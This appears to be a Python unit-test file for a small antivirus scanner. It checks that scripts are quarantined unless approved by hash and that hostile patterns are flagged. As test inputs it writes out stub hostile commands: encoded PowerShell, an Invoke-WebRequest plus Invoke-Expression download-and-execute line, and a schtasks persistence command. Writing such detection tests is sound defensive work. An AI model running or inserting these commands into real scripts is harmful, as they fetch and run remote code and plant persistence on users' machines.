"""Security regression tests: scripts remain held unless explicitly approved by hash."""
from __future__ import annotations

import hashlib
import tempfile
import unittest
from pathlib import Path

from miniav.core.scanner import scan_file
from miniav.core.policy import decide
from miniav.core.scripts import inspect_script


class ScriptTests(unittest.TestCase):
    def setUp(self):
        folder = tempfile.TemporaryDirectory()
        self.addCleanup(folder.cleanup)
        self.folder = Path(folder.name)

    def run_script(self, name: str, data: bytes, config=None):
        path = self.folder / name
        path.write_bytes(data)
        result = scan_file(path, config, rules_dir=self.folder / "no-yara")
        return result, decide(result)

    def test_unknown_benign_script_requires_review(self):
        result, decision = self.run_script("run.ps1", b"Write-Host 'Hello'")
        self.assertEqual(decision.action, "QUARANTINED")
        self.assertTrue(any(f.code == "SCRIPT_REVIEW_REQUIRED" for f in result.findings))
        self.assertFalse(any(f.code == "ACTIVE_FILE" for f in result.findings))

    def test_explicitly_approved_benign_script_is_clean(self):
        content = b"Write-Host 'Hello'"
        result, decision = self.run_script("run.ps1", content, {
            "trusted_script_sha256": [hashlib.sha256(content).hexdigest()]})
        self.assertEqual(decision.action, "CLEAN")
        self.assertTrue(result.capabilities["trusted_script_sha256"])

    def test_approved_hash_cannot_override_encoded_powershell(self):
        content = b"powershell -EncodedCommand AAA"
        result, decision = self.run_script("run.ps1", content, {
            "trusted_script_sha256": [hashlib.sha256(content).hexdigest()]})
        self.assertEqual(decision.action, "QUARANTINED")
        self.assertTrue(any(f.code == "SCRIPT_ENCODED_POWERSHELL" for f in result.findings))

    def test_encoded_powershell_utf16le(self):
        data = b"\xff\xfe" + "powershell -EncodedCommand AAA".encode("utf-16-le")
        result, decision = self.run_script("start.ps1", data)
        self.assertEqual(decision.action, "QUARANTINED")
        self.assertTrue(any(f.code == "SCRIPT_ENCODED_POWERSHELL" for f in result.findings))

    def test_download_and_execute(self):
        text = b"Invoke-WebRequest https://example.invalid/a; Invoke-Expression $x"
        result, decision = self.run_script("get.ps1", text)
        self.assertEqual(decision.action, "QUARANTINED")
        self.assertTrue(any(f.code == "SCRIPT_DOWNLOAD_EXECUTE" for f in result.findings))

    def test_persistence(self):
        result, decision = self.run_script(
            "p.cmd", b"schtasks /create /tn test /tr C:\\test.exe /sc onlogon")
        self.assertEqual(decision.action, "QUARANTINED")
        self.assertTrue(any(f.code == "SCRIPT_PERSISTENCE" for f in result.findings))

    def test_unreadable_binary_script_is_error(self):
        _, decision = self.run_script("a.ps1", b"\x00\x00\x01\x02")
        self.assertEqual(decision.action, "ERROR")

    def test_oversized_script_is_error_even_if_approved(self):
        content = b"echo hello\n" * 100
        _, decision = self.run_script("large.bat", content, {
            "max_script_bytes": 32,
            "trusted_script_sha256": [hashlib.sha256(content).hexdigest()]})
        self.assertEqual(decision.action, "ERROR")

    def test_invalid_trusted_hash_is_error(self):
        _, decision = self.run_script("hello.ps1", b"echo hello", {
            "trusted_script_sha256": ["invalid"]})
        self.assertEqual(decision.action, "ERROR")

    def test_script_without_active_suffix_is_not_automatically_executable(self):
        result, decision = self.run_script("note.txt", b"Hello")
        self.assertEqual(decision.action, "CLEAN")

    def test_utf16_powershell_without_bom(self):
        data = "powershell -enc AAA".encode("utf-16-le")
        result, _ = self.run_script("hi.ps1", data)
        self.assertTrue(any(f.code == "SCRIPT_ENCODED_POWERSHELL" for f in result.findings))

    def test_no_script_execution_during_inspection(self):
        # This is text only; the detector is forbidden from launching commands.
        info = inspect_script(b"echo harmless")
        self.assertEqual(len(info.findings), 0)
